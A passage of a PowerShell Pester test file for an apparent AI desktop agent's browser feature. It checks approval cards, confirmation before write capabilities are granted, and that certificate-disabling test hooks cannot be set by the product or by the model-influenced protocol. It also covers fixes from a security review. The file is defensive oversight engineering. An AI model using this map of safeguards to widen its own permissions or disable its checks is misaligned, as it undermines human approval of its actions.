        $script:AppJs | Should -Match ([regex]::Escape("summary.$Key"))
    }

    It 'leaves no summary field unrendered' {
        # 'project' is shown by the surrounding conversation, not the card.
        foreach ($key in $script:SummaryKeys) {
            if ($key -eq 'project') { continue }
            $script:AppJs | Should -Match ([regex]::Escape("summary.$key")) -Because "the card must show summary.$key"
        }
    }

    It 'gives a browser approval its own title rather than the terminal one' -TestCases @(
        @{ Key = 'approval.title.navigation' }, @{ Key = 'approval.title.fill' }
        @{ Key = 'approval.title.press' }, @{ Key = 'approval.title.upload' }
        @{ Key = 'approval.title.download' }
    ) {
        param($Key)
        $script:AppJs | Should -Match ([regex]::Escape($Key))
        foreach ($locale in $script:LocaleFiles.Keys) {
            $script:LocaleFiles[$locale] | Should -Match ([regex]::Escape("'$Key'")) -Because "$locale must translate it"
        }
    }

    It 'has both locales for every approval string the card uses' {
        $used = @([regex]::Matches($script:AppJs, "t\('(approval\.[A-Za-z.]+)'\)") | ForEach-Object { $_.Groups[1].Value } | Select-Object -Unique)
        $used.Count | Should -BeGreaterThan 5
        foreach ($key in $used) {
            foreach ($locale in $script:LocaleFiles.Keys) {
                $script:LocaleFiles[$locale] | Should -Match ([regex]::Escape("'$key'")) -Because "$locale is missing $key"
            }
        }
    }

    It 'never builds the card as markup' {
        # Every value on the card is model-authored or page-influenced.
        $start = $script:AppJs.IndexOf('function approvalRow(')
        $end = $script:AppJs.IndexOf('function renderApproval(')
        $start | Should -BeGreaterThan 0
        $section = $script:AppJs.Substring($start, ($script:AppJs.IndexOf('scrollThread();', $end) - $start))
        $section | Should -Not -Match 'innerHTML'
        $section | Should -Not -Match 'insertAdjacentHTML'
    }

    It 'says so rather than rendering blank when it cannot describe the action' {
        $script:AppJs | Should -Match 'approval\.noDetail'
        foreach ($locale in $script:LocaleFiles.Keys) {
            $script:LocaleFiles[$locale] | Should -Match "'approval\.noDetail'"
        }
    }

    It 'does not offer Run it for an action that runs nothing' {
        $script:AppJs | Should -Match "approval\.allow"
        $script:AppJs | Should -Match "kind === 'Terminal' \? 'approval\.approve' : 'approval\.allow'"
    }
}

Describe 'Project browser settings' -Tag 'Unit' {
    BeforeAll {
        $webRoot = Join-Path $PSScriptRoot '..' '..' 'source' 'web' | Convert-Path
        $script:SettingsJs = Get-Content -LiteralPath (Join-Path $webRoot 'assets' 'app.js') -Raw
    }

    It 'offers every capability the API accepts' -TestCases @(
        @{ Capability = 'fill' }, @{ Capability = 'submit' }
        @{ Capability = 'upload' }, @{ Capability = 'download' }
    ) {
        param($Capability)
        $script:SettingsJs | Should -Match ([regex]::Escape("key: '$Capability'"))
    }

    It 'offers nothing the API would reject' {
        $offered = @([regex]::Matches($script:SettingsJs, "key: '(fill|submit|upload|download|[a-z_]+)',\s*\r?\n\s*label:") |
                ForEach-Object { $_.Groups[1].Value })
        $offered.Count | Should -Be 4
        foreach ($capability in $offered) {
            { ConvertTo-DpProject -InputObject @{ path = 'C:\p'; browserActions = @($capability) } } | Should -Not -Throw
        }
    }

    # Granting a write capability is a considered edit, not a reflex. The
    # approval card deliberately has no such button.
    It 'confirms before granting a write capability' {
        ([regex]::Matches($script:SettingsJs, 'confirm:')).Count | Should -BeGreaterOrEqual 4
        $script:SettingsJs | Should -Match 'box\.checked && !window\.confirm\(capability\.confirm\)'
    }

    It 'warns that a press cannot be undone' {
        $script:SettingsJs | Should -Match 'send, buy, change or delete'
    }

    It 'states that credential boxes are never filled' {
        $script:SettingsJs | Should -Match 'never type into a password'
    }

    It 'lets the project carry extra sites' {
        $script:SettingsJs | Should -Match 'browserDomains'
        $script:SettingsJs | Should -Match 'project-browser-sites'
    }

    It 'sends the whole project list rather than a partial patch' {
        # Merge-DpSettings replaces projects wholesale, so a partial row would
        # silently drop the other fields on that project.
        $script:SettingsJs | Should -Match 'browserActions: box\.checked \? without\.concat\(capability\.key\) : without'
    }
}

Describe 'Browser runtime lifecycle' -Tag 'Unit' {
    BeforeAll {
        $script:LifeRoot = Join-Path ([System.IO.Path]::GetTempPath()) ("dp-life-" + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path (Join-Path $script:LifeRoot 'browsers' 'chromium-1200') -Force | Out-Null
        $script:BrowserExe = Join-Path $script:LifeRoot 'browsers' 'chromium-1200' 'chrome.exe'
    }

    AfterAll {
        if (Test-Path -LiteralPath $script:LifeRoot) {
            Remove-Item -LiteralPath $script:LifeRoot -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    Context 'finding leftover browsers' {
        # The discriminator is the executable path, never the process name.
        # Matching on "chrome" would sweep up the user's own browser, which is
        # the single worst thing this could do.
        It 'finds a process running from the DeskPilot runtime' {
            Mock Get-DpProcessSnapshot { @(@{ id = 4242; name = 'chrome'; path = $script:BrowserExe; started = (Get-Date) }) }
            # Wrapped, like every caller: a single-element return unrolls, and
            # .Count on a bare hashtable is its key count rather than one.
            $orphans = @(Get-DpBrowserOrphan -RuntimeRoot $script:LifeRoot)
            $orphans.Count | Should -Be 1
            $orphans[0].id | Should -Be 4242
        }

        It 'reports an empty result as empty rather than as one phantom entry' {
            # ', $array.ToArray()' on an empty list yields a one-element array
            # wrapping an empty array, so @() at the call site counts a phantom.
            # That made the hostile-site proof report an orphan that did not exist.
            Mock Get-DpProcessSnapshot { @() }
            @(Get-DpBrowserOrphan -RuntimeRoot $script:LifeRoot).Count | Should -Be 0
            @(Get-DpBrowserScope -StartUrl 'file:///C:/secret').Count | Should -Be 0
        }

        It 'leaves the user own browser alone' -TestCases @(
            @{ Path = 'C:\Program Files\Google\Chrome\Application\chrome.exe' }
            @{ Path = 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe' }
            @{ Path = '/usr/bin/chromium' }
        ) {
            param($Path)
            Mock Get-DpProcessSnapshot { @(@{ id = 99; name = 'chrome'; path = $Path; started = (Get-Date) }) }
            Get-DpBrowserOrphan -RuntimeRoot $script:LifeRoot | Should -BeNullOrEmpty
        }

        It 'ignores a process whose path it cannot read' {
            Mock Get-DpProcessSnapshot { @(@{ id = 7; name = 'chrome'; path = ''; started = $null }) }
            Get-DpBrowserOrphan -RuntimeRoot $script:LifeRoot | Should -BeNullOrEmpty
        }

        It 'is not fooled by a path that merely starts with the same letters' {
            Mock Get-DpProcessSnapshot {
                @(@{ id = 8; name = 'chrome'; path = ($script:LifeRoot + '-evil\browsers\chromium-1200\chrome.exe'); started = $null })
            }
            Get-DpBrowserOrphan -RuntimeRoot $script:LifeRoot | Should -BeNullOrEmpty
        }

        It 'reports nothing when nothing is running' {
            Mock Get-DpProcessSnapshot { @() }
            Get-DpBrowserOrphan -RuntimeRoot $script:LifeRoot | Should -BeNullOrEmpty
        }
    }

    Context 'removing the runtime' {
        It 'reports an install that was never there rather than failing' {
            $absent = Join-Path $script:LifeRoot 'never-installed'
            $result = Uninstall-DpBrowserRuntime -RuntimeRoot $absent -Confirm:$false
            $result.alreadyAbsent | Should -BeTrue
            $result.error | Should -BeNullOrEmpty
        }

        It 'deletes the runtime folder' {
            Mock Get-DpProcessSnapshot { @() }
            $doomed = Join-Path ([System.IO.Path]::GetTempPath()) ("dp-doomed-" + [guid]::NewGuid().ToString('N'))
            New-Item -ItemType Directory -Path (Join-Path $doomed 'node_modules') -Force | Out-Null

            $result = Uninstall-DpBrowserRuntime -RuntimeRoot $doomed -Confirm:$false
            $result.removed | Should -BeTrue
            Test-Path -LiteralPath $doomed | Should -BeFalse
        }

        # Deleting the folder under a running browser leaves a half-removed
        # install that reports as broken rather than absent, which is worse:
        # it offers repair for something the user asked to be rid of.
        It 'closes leftover processes before deleting' {
            $doomed = Join-Path ([System.IO.Path]::GetTempPath()) ("dp-doomed-" + [guid]::NewGuid().ToString('N'))
            New-Item -ItemType Directory -Path $doomed -Force | Out-Null
            Mock Get-DpProcessSnapshot { @() }
            Mock Remove-DpBrowserOrphan { @{ found = 0; closed = 0; failed = @() } }

            $null = Uninstall-DpBrowserRuntime -RuntimeRoot $doomed -Confirm:$false
            Should -Invoke Remove-DpBrowserOrphan -Times 1 -Exactly
        }

        It 'never touches Node, which DeskPilot did not install' {
            $source = Get-Command Uninstall-DpBrowserRuntime | ForEach-Object { $_.Definition }
            $source | Should -Not -Match 'nodejs|node\.exe'
        }
    }

    # The supervisor carries two environment-gated hooks so the hostile-site
    # harness can serve a real https origin on a real hostname. They exist
    # because weakening the policy to make testing convenient would test the
    # wrong thing - but a hook nothing checks is a hook that eventually ships on.
    Context 'the test hooks are unreachable from the product' {
        BeforeAll {
            $script:PrivateRoot = Join-Path $PSScriptRoot '..' '..' 'source' 'Private' | Convert-Path
            $script:PublicRoot = Join-Path $PSScriptRoot '..' '..' 'source' 'Public' | Convert-Path
            $script:WebRootForHooks = Join-Path $PSScriptRoot '..' '..' 'source' 'web' | Convert-Path
        }

        It 'no production code assigns <Hook>' -TestCases @(
            @{ Hook = 'DESKPILOT_BROWSER_TEST_ARGS' }
            @{ Hook = 'DESKPILOT_BROWSER_TEST_INSECURE' }
        ) {
            param($Hook)
            # Forwarding one that already exists in the environment is fine - a
            # page and a model can reach neither. Assigning one would mean
            # DeskPilot could switch off its own certificate checking.
            $hits = @(Get-ChildItem -Path $script:PrivateRoot, $script:PublicRoot, $script:WebRootForHooks -Recurse -File |
                    Select-String -Pattern "\`$env:$Hook\s*=|Environment\['$Hook'\]\s*=")
            $hits | Should -BeNullOrEmpty -Because 'only the environment DeskPilot was started in may set it'
        }

        It 'forwards the hooks by prefix rather than naming them in the product' {
            $source = Get-Command Start-DpBrowserSession | ForEach-Object { $_.Definition }
            $source | Should -Match "DESKPILOT_BROWSER_TEST_\*"
            $source | Should -Not -Match 'DESKPILOT_BROWSER_TEST_INSECURE'
        }

        It 'reports an active hook rather than running quietly' {
            $supervisor = Get-Content -LiteralPath (Join-Path $PSScriptRoot '..' '..' 'source' 'browser' 'supervisor.mjs') -Raw
            $supervisor | Should -Match 'testHooks:'
            (Get-Command Start-DpBrowserSession | ForEach-Object { $_.Definition }) | Should -Match 'Write-Warning'
        }

        It 'the supervisor reads them from the environment only' {
            $supervisor = Get-Content -LiteralPath (Join-Path $PSScriptRoot '..' '..' 'source' 'browser' 'supervisor.mjs') -Raw
            $supervisor | Should -Match 'process\.env\.DESKPILOT_BROWSER_TEST_ARGS'
            $supervisor | Should -Match 'process\.env\.DESKPILOT_BROWSER_TEST_INSECURE'
            # Never from a protocol command, which is the one channel the model
            # can influence.
            $supervisor | Should -Not -Match 'ignoreHTTPSErrors:\s*[a-z]*insecure[a-z]*\s*\?\?'
            $supervisor | Should -Match 'ignoreHTTPSErrors: testInsecure'
        }

        It 'certificate errors are honoured unless a hook is set' {
            $supervisor = Get-Content -LiteralPath (Join-Path $PSScriptRoot '..' '..' 'source' 'browser' 'supervisor.mjs') -Raw
            $supervisor | Should -Match "DESKPILOT_BROWSER_TEST_INSECURE === '1'"
        }
    }
}

# Every finding from the agentic security review of 2026-09-05. A fix without a
# test is the same shape of claim the review was called to check.
Describe 'Security review regressions' -Tag 'Unit' {
    Context 'B-3 - Stop and the end of a Turn close the browser' {
        It 'the Turn closes the browser in its finally, not on the next Turn' {
            $source = Get-Content -LiteralPath (Join-Path $PSScriptRoot '..' '..' 'source' 'Private' 'Invoke-DpTurn.ps1') -Raw
            $finally = $source.Substring($source.LastIndexOf('finally {'))
            $finally | Should -Match 'Close-DpBrowserSession'
        }

        It 'the stop route closes the browser rather than only cancelling bridges' {
            $source = Get-Content -LiteralPath (Join-Path $PSScriptRoot '..' '..' 'source' 'Private' 'Invoke-DpRouteHandler.ps1') -Raw
            $stop = [regex]::Match($source, "'stopTurn' \{.*?\n        \}", 'Singleline').Value
            $stop | Should -Match 'Close-DpBrowserSession'
        }
    }

    Context 'B-4 - the asset-root hook carries the tested prefix' {
        It 'the override is named under DESKPILOT_BROWSER_TEST_' {
            $source = Get-Command Get-DpBrowserAssetRoot | ForEach-Object { $_.Definition }
            $source | Should -Match 'DESKPILOT_BROWSER_TEST_ROOT'
            # The un-prefixed name replaced policy.mjs and supervisor.mjs with
            # arbitrary Node code, with no guard test and no warning.
            $source | Should -Not -Match 'DESKPILOT_BROWSER_ROOT\b'
        }

        It 'an active override is reported by the runtime' {
            $previous = [System.Environment]::GetEnvironmentVariable('DESKPILOT_BROWSER_TEST_ROOT')
            try {
                $env:DESKPILOT_BROWSER_TEST_ROOT = $PSScriptRoot
                $runtime = Get-DpBrowserRuntime -RuntimeRoot (Join-Path ([System.IO.Path]::GetTempPath()) 'nope') -PinnedVersion '1.63.0'
                $runtime.testHooks | Should -Contain 'DESKPILOT_BROWSER_TEST_ROOT'
                ($runtime.issues -join ' ') | Should -Match 'test hooks'
            }
            finally {
                if ($null -eq $previous) { Remove-Item Env:DESKPILOT_BROWSER_TEST_ROOT -ErrorAction SilentlyContinue }
                else { $env:DESKPILOT_BROWSER_TEST_ROOT = $previous }
            }
        }

        It 'reports no hooks when none are set' {
            (Get-DpBrowserRuntime -RuntimeRoot (Join-Path ([System.IO.Path]::GetTempPath()) 'nope') -PinnedVersion '1.63.0').testHooks |
                Should -BeNullOrEmpty
        }
    }

    Context 'M-2 - the protocol carries the value that was approved' {
        BeforeAll {
            $script:EncodingRoot = Join-Path ([System.IO.Path]::GetTempPath()) ("dp-enc-" + [guid]::NewGuid().ToString('N'))
            New-Item -ItemType Directory -Path $script:EncodingRoot -Force | Out-Null
            $script:EncodingNode = [bool](Get-Command node -CommandType Application -ErrorAction SilentlyContinue)
        }

        AfterAll {
            if (Test-Path -LiteralPath $script:EncodingRoot) {
                Remove-Item -LiteralPath $script:EncodingRoot -Recurse -Force -ErrorAction SilentlyContinue
            }
        }

        # Without UTF-8 on the pipes, .NET falls back to the console code page:
        # the card shows 'Straße', the fingerprint binds 'Straße', and the
        # supervisor types 'Stra?e'. The action performed is not the one approved.
        It 'round-trips <Value> unchanged' -Skip:(-not $script:EncodingNode) -TestCases @(
            @{ Value = 'Stra' + [char]0x00DF + 'e' }
            @{ Value = 'Gr' + [char]0x00FC + [char]0x00DF + 'e' }
            @{ Value = 'Osorno, Chile - 12' + [char]0x00B0 + 'C' }
            @{ Value = [char]0x65E5 + [char]0x672C + [char]0x8A9E }
            @{ Value = 'caf' + [char]0x00E9 + ' na' + [char]0x00EF + 've' }
        ) {
            param($Value)
            $session = Start-DpBrowserSession -Scope @('example.test') -RuntimeRoot $script:EncodingRoot `
                -SupervisorPath (Join-Path $PSScriptRoot 'fixtures' 'fake-supervisor.mjs') -StartTimeoutSeconds 30
            try {
                $response = Invoke-DpBrowserRequest -Session $session -Command 'echo' -Payload @{ value = $Value } -TimeoutSeconds 20
                $response.ok | Should -BeTrue
                $response.result.echoed | Should -Be $Value
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }

        It 'sets UTF-8 on both pipes rather than inheriting the console code page' {
            $source = Get-Command Start-DpBrowserSession | ForEach-Object { $_.Definition }
            $source | Should -Match 'StandardInputEncoding'
            $source | Should -Match 'StandardOutputEncoding'
        }
    }

    Context 'M-5 and M-4 - declared bounds are enforced, not decorative' {
        BeforeAll {
            $script:Supervisor = Get-Content -LiteralPath (Join-Path $PSScriptRoot '..' '..' 'source' 'browser' 'supervisor.mjs') -Raw
        }

        It 'the download cap is read, not merely declared' {
            # It existed only as a constant: an approved 40 GB download filled
            # the disk while the comment claimed every bound was a refusal.
            ([regex]::Matches($script:Supervisor, 'downloadBytes')).Count | Should -BeGreaterThan 1
            $script:Supervisor | Should -Match 'rmSync\(target'
        }

        It 'bounds page-controlled href and title' {
            $script:Supervisor | Should -Match 'hrefChars'
            $script:Supervisor | Should -Match 'titleChars'
        }

        It 'bounds the emitted refusals, not only the array' {
            $script:Supervisor | Should -Match 'if \(state\.blocked\.length >= 200\) return;'
        }
    }

    Context 'M-7 - a write is bound to the page it was approved on' {
        It 'the supervisor refuses a page that moved' {
            $supervisor = Get-Content -LiteralPath (Join-Path $PSScriptRoot '..' '..' 'source' 'browser' 'supervisor.mjs') -Raw
            $supervisor | Should -Match 'function assertSamePage'
            foreach ($handler in 'fill', 'press', 'upload', 'download') {
                $supervisor | Should -Match "async $handler\(\{[^}]*expectedUrl"
            }
        }

        It 'the tool sends the approved page url with every write' {
            $source = Get-Command Invoke-DpBrowserTool | ForEach-Object { $_.Definition }
            ([regex]::Matches($source, 'expectedUrl = \$pageUrl')).Count | Should -Be 4
        }
    }

    Context 'm-4 - a reused pid cannot redirect a tree kill' {
        It 're-checks the executable path at the moment of the kill' {
            $source = Get-Command Remove-DpBrowserOrphan | ForEach-Object { $_.Definition }
            $source | Should -Match '\$current -ne \$orphan\.path'
        }
    }

    Context 'm-7 - uninstalling the browser does not delete saved files' {
        It 'downloads live outside the folder uninstall removes' {
            $source = Get-Content -LiteralPath (Join-Path $PSScriptRoot '..' '..' 'source' 'Private' 'Invoke-DpTurn.ps1') -Raw
            $source | Should -Match "browser-downloads"
            $source | Should -Not -Match "Join-Path \`$browserRuntime\.runtimeRoot 'downloads'"
        }
    }
}











